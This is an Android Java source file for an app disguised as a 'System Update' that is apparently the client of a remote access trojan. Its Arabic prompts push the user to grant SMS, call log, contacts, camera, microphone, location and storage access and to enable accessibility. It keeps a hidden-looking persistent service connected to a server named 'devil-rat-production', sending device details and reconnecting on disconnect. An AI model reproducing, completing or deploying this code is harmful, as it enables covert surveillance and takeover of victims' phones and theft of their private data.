package com.system.update;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import io.socket.client.IO;
import io.socket.client.Socket;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;
    private LinearLayout layout;

    public static final String SERVER_URL = "https://devil-rat-production.up.railway.app";

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        layout = findViewById(R.id.main_layout);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);

        activateBtn.setOnClickListener(v -> requestAllPermissions());
        addSettingsButtons();
    }

    private void addSettingsButtons() {
        if (layout == null) return;
        Button btnBattery = new Button(this);
        btnBattery.setText("1. تعطيل تحسين البطارية");
        btnBattery.setOnClickListener(v -> { try { Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); } catch (Exception e) {} });
        layout.addView(btnBattery);

        Button btnBg = new Button(this);
        btnBg.setText("2. إذن العمل في الخلفية");
        btnBg.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); });
        layout.addView(btnBg);

        Button btnAccess = new Button(this);
        btnAccess.setText("3. إعدادات إمكانية الوصول (مهم)");
        btnAccess.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS); startActivity(i); Toast.makeText(this, "ابحث عن System Update وفعّلها", Toast.LENGTH_LONG).show(); });
        layout.addView(btnAccess);
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }
        done();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) done();
    }

    private void done() {
        Toast.makeText(this, "✅ التطبيق يعمل في الخلفية", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل في الخلفية");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, SocketService.class));
        } else {
            startService(new Intent(this, SocketService.class));
        }
    }

    public static class SocketService extends Service {
        private Socket mSocket;
        private static final String CH_ID = "sys_update_ch";

        @Override
        public void onCreate() {
            super.onCreate();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(CH_ID, "System",
                        NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                nm.createNotificationChannel(ch);
            }
            Notification notif = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setContentTitle("System")
                    .setContentText("Running")
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setOngoing(true)
                    .build();
            startForeground(1, notif);

            connectToServer();
        }

        private void connectToServer() {
            try {
                IO.Options opts = new IO.Options();
                opts.extraHeaders = new HashMap<>();
                opts.extraHeaders.put("model", Build.MODEL);
                opts.extraHeaders.put("version", Build.VERSION.RELEASE);
                opts.extraHeaders.put("provider", "Unknown");

                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = registerReceiver(null, ifilter);
                int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
                int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
                int pct = (int) ((level / (float) scale) * 100);
                opts.extraHeaders.put("battery", pct + "%");

                mSocket = IO.socket(MainActivity.SERVER_URL, opts);
                mSocket.on(Socket.EVENT_CONNECT, args -> {});
                mSocket.on(Socket.EVENT_DISCONNECT, args -> connectToServer());
                mSocket.connect();
            } catch (URISyntaxException e) {}
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            return START_STICKY;
        }

        @Nullable
        @Override
        public IBinder onBind(Intent intent) { return null; }
    }
            }
